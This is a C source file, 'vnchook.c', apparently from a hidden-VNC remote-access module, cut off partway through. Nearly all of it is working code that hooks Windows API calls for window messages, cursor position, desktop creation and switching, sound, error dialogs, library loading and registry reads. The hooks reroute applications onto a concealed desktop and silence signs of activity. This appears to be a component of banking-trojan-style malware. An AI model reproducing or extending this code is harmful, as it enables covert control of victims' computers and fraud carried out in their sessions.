//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: vnchook.c
// $Revision: 205 $
// $Date: 2014-07-16 12:49:43 +0400 (Ср, 16 июл 2014) $
// description: 
//	imports hooks to support vnc functionality
//	various window function, registry, etc

#define INITGUID

#include "vncmain.h"
#include <CommCtrl.h>
#include <Uxtheme.h>
#include <Shlobj.h>
#include <Mmsystem.h>
#include <malloc.h>

#include "namespc.h"
#include "vncwnd.h"
#include "vnchook.h"
#include "vncsrv.h"
#include "wndhook.h"
#include "sound.h"

#include "rt\reg.h"
#include "rt\str.h"

#include "vnc\mouse.h"
#include "vnc\wnd_watcher.h"
#include "vnc\browser.h"
#include "vnc\virtreg.h"
#include "vnc\names.h"
#include "vnc\start_menu.h"

#include "shell.h"

#undef LoadLibraryA
#undef LoadLibraryW
#undef LoadLibraryExA
#undef LoadLibraryExW

#pragma warning(disable:4244)

#define FixMsg(r,Msg) FixMessage(r,Msg);

#define DEFPROC_PROLOG(hWnd) \
	if ( g_VncSharedSection.Data )\
	{\
		LRESULT Result;\
		if (uMsg == g_VncSharedSection.Data->dwVNCMessage) {\
			Result = HandleVNCMsg(hWnd,wParam,lParam);\
			LEAVE_HOOK(); \
			return Result; \
		} \
		else if ((g_bIsShell) && ((hWnd == g_pSession->Desktop.hDefView) || (hWnd == g_pSession->Desktop.hDeskListView)) && (uMsg == WM_ERASEBKGND)){ \
			Result = EraseBkg(hWnd,wParam);\
			LEAVE_HOOK(); \
			return Result; \
		}\
		else if ((uMsg == WM_NCACTIVATE) && (wParam) && !BR_IsIE() && !g_bIsShell){ \
			LEAVE_HOOK(); \
			return 0;\
		} \
	}

//////////////////////////////////////////////////////////////////////////
// user32 hooks
DECLARE_U32_HOOK(DefWindowProcW);
DECLARE_U32_HOOK(DefWindowProcA);
DECLARE_U32_HOOK(DefDlgProcW);
DECLARE_U32_HOOK(DefDlgProcA);
DECLARE_U32_HOOK(DefFrameProcW);
DECLARE_U32_HOOK(DefFrameProcA);
DECLARE_U32_HOOK(DefMDIChildProcW);
DECLARE_U32_HOOK(DefMDIChildProcA);
DECLARE_U32_HOOK(CallWindowProcW);
DECLARE_U32_HOOK(CallWindowProcA);
DECLARE_U32_HOOK(GetMessageW);
DECLARE_U32_HOOK(GetMessageA);
DECLARE_U32_HOOK(PeekMessageW);
DECLARE_U32_HOOK(PeekMessageA);

DECLARE_U32_HOOK(TranslateMessage);

DECLARE_U32_HOOK(GetCursorPos);
DECLARE_U32_HOOK(SetCursorPos);
DECLARE_U32_HOOK(GetMessagePos);

DECLARE_U32_HOOK(SetCapture);
DECLARE_U32_HOOK(ReleaseCapture);
DECLARE_U32_HOOK(GetCapture);

DECLARE_U32_HOOK(CreateDesktopA);
DECLARE_U32_HOOK(CreateDesktopW);
DECLARE_U32_HOOK(CreateDesktopExA);
DECLARE_U32_HOOK(CreateDesktopExW);

DECLARE_U32_HOOK(OpenDesktopA);
DECLARE_U32_HOOK(OpenDesktopW);
DECLARE_U32_HOOK(OpenInputDesktop);
DECLARE_U32_HOOK(SwitchDesktop);
DECLARE_U32_HOOK(SetThreadDesktop);

DECLARE_U32_HOOK(GetUserObjectInformationA);
DECLARE_U32_HOOK(GetUserObjectInformationW);

DECLARE_U32_HOOK(FlashWindowEx);
DECLARE_U32_HOOK(FlashWindow);
DECLARE_U32_HOOK(GetCaretBlinkTime);
DECLARE_U32_HOOK(TrackPopupMenuEx);
DECLARE_U32_HOOK(SetShellWindow);
DECLARE_U32_HOOK(SetShellWindowEx);
DECLARE_U32_HOOK(GetShellWindow);

DECLARE_U32_HOOK(SetTaskmanWindow);
DECLARE_U32_HOOK(GetTaskmanWindow);
DECLARE_U32_HOOK(SetProgmanWindow);
DECLARE_U32_HOOK(GetProgmanWindow);

DECLARE_U32_HOOK(SystemParametersInfoW);
DECLARE_U32_HOOK(SystemParametersInfoA);

DECLARE_G32_HOOK(SetDIBitsToDevice);
DECLARE_G32_HOOK(BitBlt);

// sound
DECLARE_WINMM_HOOK(PlaySoundA);
DECLARE_WINMM_HOOK(PlaySoundW);
DECLARE_WINMM_HOOK(sndPlaySoundA);
DECLARE_WINMM_HOOK(sndPlaySoundW);
DECLARE_K32_HOOK(Beep);
DECLARE_U32_HOOK(MessageBeep);
DECLARE_WINMM_HOOK(waveOutOpen);

DECLARE_DSOUND_HOOK(DirectSoundCreate);
DECLARE_DSOUND_HOOK(DirectSoundCaptureCreate);
DECLARE_DSOUND_HOOK(DirectSoundFullDuplexCreate8);
DECLARE_DSOUND_HOOK(DirectSoundFullDuplexCreate);
DECLARE_DSOUND_HOOK(DirectSoundCreate8);
DECLARE_DSOUND_HOOK(DirectSoundCaptureCreate8);

// system
DECLARE_K32_HOOK(LoadLibraryA);
DECLARE_K32_HOOK(LoadLibraryW);
DECLARE_K32_HOOK(LoadLibraryExA);
DECLARE_K32_HOOK(LoadLibraryExW);
DECLARE_K32_HOOK(GetProcAddress);

//advapi
DECLARE_A32_HOOK(RegQueryValueExW); // xp
DECLARE_K32_HOOK(RegQueryValueExW); //win7
DECLARE_KERNELBASE_HOOK(RegQueryValueExW); //win8
DECLARE_NULL_HOOK(RegQueryValueExW);

DECLARE_A32_HOOK(RegGetValueW); // xp
DECLARE_K32_HOOK(RegGetValueW); //win7
DECLARE_KERNELBASE_HOOK(RegGetValueW); //win8
DECLARE_NULL_HOOK(RegGetValueW);

//NT
DECLARE_NT_HOOK(RaiseHardError);
DECLARE_NT_HOOK(ConnectPort);

//shell32
DECLARE_SHELL32_HOOK(SHRestricted);
DECLARE_SHELL32_HOOK(SHGetSetSettings);
DECLARE_UXTHEME_HOOK(SetThemeAppProperties);

// Hook descriptors
static HOOK_DESCRIPTOR g_WndIatHooks[] = 
{
	DEFINE_U32_IAT_HOOK(SetCapture),
	DEFINE_U32_IAT_HOOK(ReleaseCapture),
	DEFINE_U32_IAT_HOOK(GetCapture),

	DEFINE_U32_IAT_HOOK(GetCursorPos),
	DEFINE_U32_IAT_HOOK(SetCursorPos),
	DEFINE_U32_IAT_HOOK(GetMessagePos),

	DEFINE_U32_IAT_HOOK(TranslateMessage),

	DEFINE_U32_IAT_HOOK(CreateDesktopA),
	DEFINE_U32_IAT_HOOK(CreateDesktopW),
	DEFINE_U32_IAT_HOOK_OP(CreateDesktopExA),// starting from vista
	DEFINE_U32_IAT_HOOK_OP(CreateDesktopExW),// starting from vista
	DEFINE_U32_IAT_HOOK(OpenDesktopA),
	DEFINE_U32_IAT_HOOK(OpenDesktopW),
	DEFINE_U32_IAT_HOOK(OpenInputDesktop),
	DEFINE_U32_IAT_HOOK(SwitchDesktop),
	DEFINE_U32_IAT_HOOK(SetThreadDesktop),

	DEFINE_U32_IAT_HOOK(GetUserObjectInformationA),
	DEFINE_U32_IAT_HOOK(GetUserObjectInformationW),

	DEFINE_U32_IAT_HOOK(FlashWindowEx),
	DEFINE_U32_IAT_HOOK(FlashWindow),
	DEFINE_U32_IAT_HOOK(GetCaretBlinkTime),
	DEFINE_U32_IAT_HOOK(TrackPopupMenuEx),

	// shell window
	DEFINE_U32_IAT_HOOK(SetShellWindow),
	DEFINE_U32_IAT_HOOK(SetShellWindowEx),
	DEFINE_U32_IAT_HOOK(GetShellWindow),

	//DEFINE_U32_IAT_HOOK(SetTaskmanWindow),
	//DEFINE_U32_IAT_HOOK(GetTaskmanWindow),
	//DEFINE_U32_IAT_HOOK(SetProgmanWindow),
	//DEFINE_U32_IAT_HOOK(GetProgmanWindow),

	DEFINE_U32_IAT_HOOK(SystemParametersInfoW),
	DEFINE_U32_IAT_HOOK(SystemParametersInfoA),

	DEFINE_G32_IAT_HOOK(SetDIBitsToDevice),
	DEFINE_G32_IAT_HOOK(BitBlt),

	DEFINE_U32_IAT_HOOK(DefWindowProcW),
	DEFINE_U32_IAT_HOOK(DefWindowProcA),
	DEFINE_U32_IAT_HOOK(DefDlgProcW),
	DEFINE_U32_IAT_HOOK(DefDlgProcA),
	DEFINE_U32_IAT_HOOK(DefFrameProcW),
	DEFINE_U32_IAT_HOOK(DefFrameProcA),
	DEFINE_U32_IAT_HOOK(DefMDIChildProcW),
	DEFINE_U32_IAT_HOOK(DefMDIChildProcA),
	DEFINE_U32_IAT_HOOK(CallWindowProcW),
	DEFINE_U32_IAT_HOOK(CallWindowProcA),

	DEFINE_U32_IAT_HOOK(GetMessageW),
	DEFINE_U32_IAT_HOOK(GetMessageA),
	DEFINE_U32_IAT_HOOK(PeekMessageW),
	DEFINE_U32_IAT_HOOK(PeekMessageA),

	// sound
	DEFINE_WINMM_IAT_HOOK_OP(PlaySoundA),
	DEFINE_WINMM_IAT_HOOK_OP(PlaySoundW),
	DEFINE_WINMM_IAT_HOOK_OP(sndPlaySoundA),
	DEFINE_WINMM_IAT_HOOK_OP(sndPlaySoundW),
	DEFINE_K32_IAT_HOOK_OP(Beep),
	DEFINE_U32_IAT_HOOK_OP(MessageBeep),
	DEFINE_WINMM_IAT_HOOK_OP(waveOutOpen),

	DEFINE_DSOUND_IAT_HOOK_OP(DirectSoundCreate),
	DEFINE_DSOUND_IAT_HOOK_OP(DirectSoundCaptureCreate),
	DEFINE_DSOUND_IAT_HOOK_OP(DirectSoundFullDuplexCreate8),
	DEFINE_DSOUND_IAT_HOOK_OP(DirectSoundFullDuplexCreate),
	DEFINE_DSOUND_IAT_HOOK_OP(DirectSoundCreate8),
	DEFINE_DSOUND_IAT_HOOK_OP(DirectSoundCaptureCreate8),

	// system
	DEFINE_K32_IAT_HOOK(LoadLibraryA),
	DEFINE_K32_IAT_HOOK(LoadLibraryW),
	DEFINE_K32_IAT_HOOK(LoadLibraryExA),
	DEFINE_K32_IAT_HOOK(LoadLibraryExW),
	DEFINE_K32_IAT_HOOK(GetProcAddress),

	DEFINE_NT_IAT_HOOK(ZwRaiseHardError),
	DEFINE_NT_IAT_HOOK(NtRaiseHardError),
	DEFINE_NT_IAT_HOOK(ZwConnectPort),
	DEFINE_NT_IAT_HOOK(NtConnectPort),

	//shell32
	DEFINE_SHELL32_IAT_HOOK(SHRestricted),
	DEFINE_SHELL32_IAT_HOOK(SHGetSetSettings),
	DEFINE_UXTHEME_IAT_HOOK_OP(SetThemeAppProperties),
};

static HOOK_DESCRIPTOR g_WndExpHooks[] = {

	DEFINE_U32_EXP_HOOK(SetCapture),
	DEFINE_U32_EXP_HOOK(ReleaseCapture),
	DEFINE_U32_EXP_HOOK(GetCapture),

	DEFINE_U32_EXP_HOOK(GetCursorPos),
	DEFINE_U32_EXP_HOOK(SetCursorPos),
	DEFINE_U32_EXP_HOOK(GetMessagePos),

	DEFINE_U32_EXP_HOOK(TranslateMessage),

	DEFINE_U32_EXP_HOOK(CreateDesktopA),
	DEFINE_U32_EXP_HOOK(CreateDesktopW),
	DEFINE_U32_EXP_HOOK_OP(CreateDesktopExA), // starting from vista
	DEFINE_U32_EXP_HOOK_OP(CreateDesktopExW), // starting from vista
	DEFINE_U32_EXP_HOOK(OpenDesktopA),
	DEFINE_U32_EXP_HOOK(OpenDesktopW),
	DEFINE_U32_EXP_HOOK(OpenInputDesktop),
	DEFINE_U32_EXP_HOOK(SwitchDesktop),
	DEFINE_U32_EXP_HOOK(SetThreadDesktop),

	DEFINE_U32_EXP_HOOK(GetUserObjectInformationA),
	DEFINE_U32_EXP_HOOK(GetUserObjectInformationW),

	DEFINE_U32_EXP_HOOK(FlashWindowEx),
	DEFINE_U32_EXP_HOOK(FlashWindow),
	DEFINE_U32_EXP_HOOK(GetCaretBlinkTime),
	DEFINE_U32_EXP_HOOK(TrackPopupMenuEx),

	// shell window
	DEFINE_U32_EXP_HOOK(SetShellWindow),
	DEFINE_U32_EXP_HOOK(SetShellWindowEx),
	DEFINE_U32_EXP_HOOK(GetShellWindow),

	//DEFINE_U32_EXP_HOOK(SetTaskmanWindow),
	//DEFINE_U32_EXP_HOOK(GetTaskmanWindow),
	//DEFINE_U32_EXP_HOOK(SetProgmanWindow),
	//DEFINE_U32_EXP_HOOK(GetProgmanWindow),

	DEFINE_U32_EXP_HOOK(SystemParametersInfoW),
	DEFINE_U32_EXP_HOOK(SystemParametersInfoA),

	DEFINE_G32_EXP_HOOK(SetDIBitsToDevice),
	DEFINE_G32_EXP_HOOK(BitBlt),

	DEFINE_U32_EXP_HOOK(DefWindowProcW),
	DEFINE_U32_EXP_HOOK(DefWindowProcA),
	DEFINE_U32_EXP_HOOK(DefDlgProcW),
	DEFINE_U32_EXP_HOOK(DefDlgProcA),
	DEFINE_U32_EXP_HOOK(DefFrameProcW),
	DEFINE_U32_EXP_HOOK(DefFrameProcA),
	DEFINE_U32_EXP_HOOK(DefMDIChildProcW),
	DEFINE_U32_EXP_HOOK(DefMDIChildProcA),
	DEFINE_U32_EXP_HOOK(CallWindowProcW),
	DEFINE_U32_EXP_HOOK(CallWindowProcA),

	DEFINE_U32_EXP_HOOK(GetMessageW),
	DEFINE_U32_EXP_HOOK(GetMessageA),
	DEFINE_U32_EXP_HOOK(PeekMessageW),
	DEFINE_U32_EXP_HOOK(PeekMessageA),

	DEFINE_WINMM_EXP_HOOK_OP(PlaySoundA),
	DEFINE_WINMM_EXP_HOOK_OP(PlaySoundW),
	DEFINE_WINMM_EXP_HOOK_OP(sndPlaySoundA),
	DEFINE_WINMM_EXP_HOOK_OP(sndPlaySoundW),
	DEFINE_K32_EXP_HOOK_OP(Beep),
	DEFINE_U32_EXP_HOOK_OP(MessageBeep),
	DEFINE_WINMM_EXP_HOOK_OP(waveOutOpen),

	DEFINE_DSOUND_EXP_HOOK_OP(DirectSoundCreate),
	DEFINE_DSOUND_EXP_HOOK_OP(DirectSoundCaptureCreate),
	DEFINE_DSOUND_EXP_HOOK_OP(DirectSoundFullDuplexCreate8),
	DEFINE_DSOUND_EXP_HOOK_OP(DirectSoundFullDuplexCreate),
	DEFINE_DSOUND_EXP_HOOK_OP(DirectSoundCreate8),
	DEFINE_DSOUND_EXP_HOOK_OP(DirectSoundCaptureCreate8),

	// system
	DEFINE_K32_EXP_HOOK(LoadLibraryA),
	DEFINE_K32_EXP_HOOK(LoadLibraryW),
	DEFINE_K32_EXP_HOOK(LoadLibraryExA),
	DEFINE_K32_EXP_HOOK(LoadLibraryExW),
	DEFINE_K32_EXP_HOOK(GetProcAddress),

	DEFINE_NT_EXP_HOOK(ZwRaiseHardError),
	DEFINE_NT_EXP_HOOK(NtRaiseHardError),
	DEFINE_NT_EXP_HOOK(ZwConnectPort),
	DEFINE_NT_EXP_HOOK(NtConnectPort),

	//shell32
	DEFINE_SHELL32_EXP_HOOK(SHRestricted),
	DEFINE_SHELL32_EXP_HOOK(SHGetSetSettings),
	DEFINE_UXTHEME_EXP_HOOK_OP(SetThemeAppProperties),
};

// win8 specific hooks
static HOOK_DESCRIPTOR g_WndIatHooks8[] =
{
	// on win8reg functions has been moved to kernelbase
	DEFINE_NULL_IAT_HOOK(RegQueryValueExW),
	DEFINE_NULL_IAT_HOOK(RegGetValueW),
};

static HOOK_DESCRIPTOR g_WndExpHooks8[] = 
{
	// on win8reg functions has been moved to kernelbase
	DEFINE_KERNELBASE_EXP_HOOK(RegQueryValueExW),
	DEFINE_KERNELBASE_EXP_HOOK(RegGetValueW),
};

// win7 specific hooks
static HOOK_DESCRIPTOR g_WndIatHooks7[] =
{
	// on win7 reg functions has been moved to kernel32
	DEFINE_NULL_IAT_HOOK(RegQueryValueExW),
	DEFINE_NULL_IAT_HOOK(RegGetValueW),
};

static HOOK_DESCRIPTOR g_WndExpHooks7[] = 
{
	// on win7 reg functions has been moved to kernel32
	DEFINE_K32_EXP_HOOK(RegQueryValueExW),
	DEFINE_K32_EXP_HOOK(RegGetValueW),
};

// winxp specific hooks
static HOOK_DESCRIPTOR g_WndIatHooksXP[] =
{
	// on winxp reg functions were exported by advapi32
	DEFINE_A32_IAT_HOOK(RegQueryValueExW),
	DEFINE_A32_IAT_HOOK_OP(RegGetValueW), //RegGetValueW is not available on xp 32bit
};

static HOOK_DESCRIPTOR g_WndExpHooksXP[] = 
{
	// on winxp reg functions were exported by advapi32
	DEFINE_A32_EXP_HOOK(RegQueryValueExW),
	DEFINE_A32_EXP_HOOK_OP(RegGetValueW), //RegGetValueW is not available on xp 32bit
};

//////////////////////////////////////////////////////////////////////////
// U32 HOOKS

LRESULT WINAPI my_DefWindowProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hWnd);
	lResult = DEFINE_U32_PROC(DefWindowProcW)(hWnd,uMsg,wParam,lParam);

	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_DefWindowProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hWnd);
	lResult = DEFINE_U32_PROC(DefWindowProcA)(hWnd,uMsg,wParam,lParam);

	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_DefDlgProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hWnd);
	lResult = DEFINE_U32_PROC(DefDlgProcW)(hWnd,uMsg,wParam,lParam);
	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_DefDlgProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hWnd);
	lResult = DEFINE_U32_PROC(DefDlgProcA)(hWnd,uMsg,wParam,lParam);
	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_DefFrameProcW(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hFrame);
	lResult = DEFINE_U32_PROC(DefFrameProcW)(hFrame,hClient,uMsg,wParam,lParam);
	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_DefFrameProcA(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hFrame);
	lResult = DEFINE_U32_PROC(DefFrameProcA)(hFrame,hClient,uMsg,wParam,lParam);
	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_DefMDIChildProcW(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hWnd);
	lResult = DEFINE_U32_PROC(DefMDIChildProcW)(hWnd,uMsg,wParam,lParam);
	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_DefMDIChildProcA(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hWnd);
	lResult = DEFINE_U32_PROC(DefMDIChildProcA)(hWnd,uMsg,wParam,lParam);
	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_CallWindowProcW(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hWnd);
	lResult = DEFINE_U32_PROC(CallWindowProcW)(lpPrevWndFunc,hWnd,uMsg,wParam,lParam);
	LEAVE_HOOK();
	return (lResult);
}

LRESULT WINAPI my_CallWindowProcA(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	ENTER_HOOK();

	DEFPROC_PROLOG(hWnd);
	lResult = DEFINE_U32_PROC(CallWindowProcA)(lpPrevWndFunc,hWnd,uMsg,wParam,lParam);
	LEAVE_HOOK();
	return (lResult);
}

BOOL WINAPI my_GetMessageW(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax)
{
	BOOL r;
	ENTER_HOOK();
	r = DEFINE_U32_PROC(GetMessageW)(Msg,hWnd,uMsgFilterMin,uMsgFilterMax);
	FixMsg ( r, Msg );
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_GetMessageA(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax)
{
	BOOL r;
	ENTER_HOOK();
	r = DEFINE_U32_PROC(GetMessageA)(Msg,hWnd,uMsgFilterMin,uMsgFilterMax);
	FixMsg(r,Msg);
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_PeekMessageW(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg)
{
	BOOL r;
	ENTER_HOOK();
	r = DEFINE_U32_PROC(PeekMessageW)(Msg,hWnd,uMsgFilterMin,uMsgFilterMax,uRemoveMsg);
	//workaround for ticket 9
	if ( BR_IsIE() && r && Msg && Msg->message == WM_MOUSELEAVE ){
		Msg->message = 0;
	}
	FixMsg(r,Msg);
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_PeekMessageA(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg)
{
	BOOL r;
	ENTER_HOOK();
	r = DEFINE_U32_PROC(PeekMessageA)(Msg,hWnd,uMsgFilterMin,uMsgFilterMax,uRemoveMsg);
	//workaround for ticket 9
	if ( BR_IsIE() && r && Msg && Msg->message == WM_MOUSELEAVE ){
		Msg->message = 0;
	}
	FixMsg(r,Msg);
	LEAVE_HOOK();
	return r;
}
BOOL WINAPI my_SetCursorPos(int X,int Y)
{
	BOOL r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data )
	{
		VncLockSharedSection( &g_VncSharedSection );
		g_VncSharedSection.Data->ptCursor.x = X;
		g_VncSharedSection.Data->ptCursor.y = Y;
		VncUnlockSharedSection( &g_VncSharedSection );
		r = TRUE;
	}else{
		r = DEFINE_U32_PROC(SetCursorPos)(X,Y);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_GetCursorPos(LPPOINT lpPoint)
{
	BOOL r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data )
	{
		if (lpPoint)
		{
			*lpPoint = g_VncSharedSection.Data->ptCursor;
			r = TRUE;
		}
		else{
			r = FALSE;
		}
	}else{
		r = DEFINE_U32_PROC(GetCursorPos)(lpPoint);
	}
	LEAVE_HOOK();
	return r;
}

DWORD WINAPI my_GetMessagePos(VOID)
{
	DWORD r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data )
	{
		r = (DWORD)((SHORT)g_VncSharedSection.Data->ptCursor.x | ((SHORT)(g_VncSharedSection.Data->ptCursor.y) << 16));
	}else{
		r = DEFINE_U32_PROC(GetMessagePos)();
	}
	LEAVE_HOOK();
	return r;
}

HDESK WINAPI my_OpenInputDesktop(DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess)
{
	HDESK r;
	ENTER_HOOK();
	if ( g_VncSharedSection.Data )
	{
		r = DEFINE_U32_PROC(OpenDesktopA)(g_VncSharedSection.Data->DesktopName,dwFlags,bInherit,dwDesiredAccess);
	}else{
		r = DEFINE_U32_PROC(OpenInputDesktop)(dwFlags,bInherit,dwDesiredAccess);
	}
	LEAVE_HOOK();
	return r;
}

BOOL WINAPI my_SwitchDesktop(HDESK hDesk)
{
	DbgPrint("switching to desktop\n");
	return TRUE;
}

HDESK WINAPI my_CreateDesktopA(
	LPSTR lpszDesktop,
	LPSTR lpszDevice,
	LPDEVMODE pDevmode,
	DWORD dwFlags,
	ACCESS_MASK dwDesiredAccess,
	LPSECURITY_ATTRIBUTES lpsa
	)
{
	HDESK r;
	LPSTR lpszDesktopO = lpszDesktop;

	ENTER_HOOK();

	if ( g_VncSharedSection.Data ){
		if ( lpszDesktop ){
			lpszDesktop = DecorateDesktopNameA(&g_pSession->Desktop,lpszDesktop);
		}
	}

	r = DEFINE_U32_PROC(CreateDesktopA)(lpszDesktop,lpszDevice,pDevmode,dwFlags,dwDesiredAccess,lpsa);
	if ( lpszDesktop != lpszDesktopO && lpszDesktop ){
		hFree ( lpszDesktop );
	}

	LEAVE_HOOK();
	return r;
}

HDESK WINAPI my_CreateDesktopW(
	LPWSTR lpszDesktop,
	LPWSTR lpszDevice,
	LPDEVMODE pDevmode,
	DWORD dwFlags,
	ACCESS_MASK dwDesiredAccess,
	LPSECURITY_ATTRIBUTES lpsa
	)
{
	HDESK r;
	LPWSTR lpszDesktopO = lpszDesktop;

	ENTER_HOOK();

	if ( g_VncSharedSection.Data ){
		if ( lpszDesktop ){
			lpszDesktop = DecorateDesktopNameW(&g_pSession->Desktop,lpszDesktop);
		}
	}

	r = DEFINE_U32_PROC(CreateDesktopW)(lpszDesktop,lpszDevice,pDevmode,dwFlags,dwDesiredAccess,lpsa);
	if ( lpszDesktop != lpszDesktopO && lpszDesktop ){
		hFree ( lpszDesktop );
	}

	LEAVE_HOOK();
	return r;
}

HDESK WINAPI my_CreateDesktopExA(
	LPSTR lpszDesktop,
	LPSTR lpszDevice,
	LPDEVMODE pDevmode,
	DWORD dwFlags,
	ACCESS_MASK dwDesiredAccess,
	LPSECURITY_ATTRIBUTES lpsa,
	ULONG ulHeapSize,
	PVOID pvoid
	)
{
	HDESK r;
	LPSTR lpszDesktopO = lpszDesktop;

	ENTER_HOOK();

	if ( g_VncSharedSection.Data ){
		if ( lpszDesktop ){
			lpszDesktop = DecorateDesktopNameA(&g_pSession->Desktop,lpszDesktop);
		}
	}

	r = DEFINE_U32_PROC(CreateDesktopExA)(lpszDesktop,lpszDevice,pDevmode,dwFlags,dwDesiredAccess,lpsa,ulHeapSize,pvoid);
	if ( lpszDesktop != lpszDesktopO && lpszDesktop ){
		hFree ( lpszDesktop );
	}

	LEAVE_HOOK();
	return r;
}

HDESK WINAPI my_CreateDesktopExW(
	LPWSTR lpszDesktop,
	LPWSTR lpszDevice,
	LPDEVMODE pDevmode,
	DWORD dwFlags,
	ACCESS_MASK dwDesiredAccess,
	LPSECURITY_ATTRIBUTES lpsa,
	ULONG ulHeapSize,
	PVOID pvoid
	)
{
	HDESK r;
	LPWSTR lpszDesktopO = lpszDesktop;

	ENTER_HOOK();

	if ( g_VncSharedSection.Data ){
		if ( lpszDesktop ){
			lpszDesktop = DecorateDesktopNameW(&g_pSession->Desktop,lpszDesktop);
		}
	}

	r = DEFINE_U32_PROC(CreateDesktopExW)(lpszDesktop,lpszDevice,pDevmode,dwFlags,dwDesiredAccess,lpsa,ulHeapSize,pvoid);
	if ( lpszDesktop != lpszDesktopO && lpszDesktop ){
		hFree ( lpszDesktop );
	}

	LEAVE_HOOK();
	return r;
}



HDESK WINAPI my_OpenDesktopA(LPSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess)
{
	HDESK r;
	LPSTR lpszDesktopO = lpszDesktop;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data ){
		if ( lpszDesktop ){
			lpszDesktop = DecorateDesktopNameA(&g_pSession->Desktop,lpszDesktop);
		}
	}
	r = DEFINE_U32_PROC(OpenDesktopA)(lpszDesktop,dwFlags,bInherit,dwDesiredAccess);
	if ( lpszDesktop != lpszDesktopO && lpszDesktop ){
		hFree ( lpszDesktop );
	}

	LEAVE_HOOK();
	return r;
}

HDESK WINAPI my_OpenDesktopW(LPWSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess)
{
	HDESK r;
	LPWSTR lpszDesktopO = lpszDesktop;

	ENTER_HOOK();
	if ( g_VncSharedSection.Data ){
		if ( lpszDesktop ){
			lpszDesktop = DecorateDesktopNameW(&g_pSession->Desktop,lpszDesktop);
		}
	}
	r = DEFINE_U32_PROC(OpenDesktopW)(lpszDesktop,dwFlags,bInherit,dwDesiredAccess);
	if ( lpszDesktop != lpszDesktopO && lpszDesktop ){
		hFree ( lpszDesktop );
	}

	LEAVE_HOOK();
	return r;
}

BOOL
WINAPI
	my_GetUserObjectInformationA(
		HANDLE hObj,
		int nIndex,
		PVOID pvInfo,
		DWORD nLength,
		LPDWORD lpnLengthNeeded
		)
{
	BOOL r;

	ENTER_HOOK();
	r = DEFINE_U32_PROC(GetUserObjectInformationA)(hObj,nIndex,pvInfo,nLength,lpnLengthNeeded);

	if ( r && pvInfo && nLength && nIndex == UOI_NAME )
	{
		UndcorateDesktopNameA(&g_pSession->Desktop,(LPSTR)pvInfo);
	}
	LEAVE_HOOK();
	return r;
}

BOOL
WINAPI
	my_GetUserObjectInformationW(
		HANDLE hObj,
		int nIndex,
		PVOID pvInfo,
		DWORD nLength,
		LPDWORD lpnLengthNeeded
		)
{
	BOOL r;

	ENTER_HOOK();
	r = DEFINE_U32_PROC(GetUserObjectInformationW)(hObj,nIndex,pvInfo,nLength,lpnLengthNeeded);

	if ( r && pvInfo && nLength && nIndex == UOI_NAME )
	{
		UndcorateDesktopNameW(&g_pSession->Desktop,(LPWSTR)pvInfo);
	}
	LEAVE_HOOK();
	return r;
}

//
// thread can't set new desktop if it has windows hook installed (SetWindowsHookEx)
// we need to remove the current hook temporary, set new desktop and reinstall hook
//
BOOL WINAPI my_SetThreadDesktop(IN HDESK hDesktop )
{
	BOOL r;
	DWORD ThreadID = GetCurrentThreadId();
	ENTER_HOOK();

	WndHookOnThreadDetach( ThreadID );

	r = DEFINE_U32_PROC(SetThreadDesktop)(hDesktop);

	WndHookOnThreadAttach ( ThreadID );

	LEAVE_HOOK();
	return r;
}


BOOL WINAPI my_FlashWindowEx(PFLASHWINFO pfwi)
{
	BOOL r;
	ENTER_HOOK();

	if ( g_VncSharedSection.Data ){
		r = TRUE;
	}else{
